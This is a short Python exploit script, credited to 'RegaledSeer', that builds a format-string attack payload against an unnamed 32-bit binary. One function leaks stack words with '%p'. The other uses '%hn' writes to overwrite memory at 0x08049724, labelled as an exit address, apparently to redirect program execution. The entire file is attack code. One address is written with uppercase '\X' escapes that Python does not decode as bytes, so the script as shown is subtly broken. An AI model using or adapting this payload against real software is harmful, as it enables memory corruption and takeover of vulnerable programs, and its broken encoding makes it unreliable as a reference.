# Exploit made by RegaledSeer
import sys

EXIT_ADDRESS = "\x24\x97\x04\x08"
EXIT_ADDRESS_TWO = "\X26\X97\X04\X08"
DUMMY_STRING = "AAAA"
DUMMY_STRING_TWO = "BBBB"
FIRST_WRITE = 0x84b4
SECOND_WRITE = 0x10804

def find_exploit():
    payload = ""
    payload += DUMMY_STRING
    payload += DUMMY_STRING_TWO
    payload += "%4$p"
    payload += "%5$p"
    return payload

def craft_exploit():
    payload = ""
    payload += EXIT_ADDRESS
    payload += EXIT_ADDRESS_TWO
    payload += "%{0}x".format(FIRST_WRITE)
    payload += "%4$hn"
    payload += "%{0}x".format(SECOND_WRITE-FIRST_WRITE)
    payload += "%5$hn"
    return payload

def main():
    sys.stdout.write(craft_exploit())

if __name__ == "__main__":
    main()

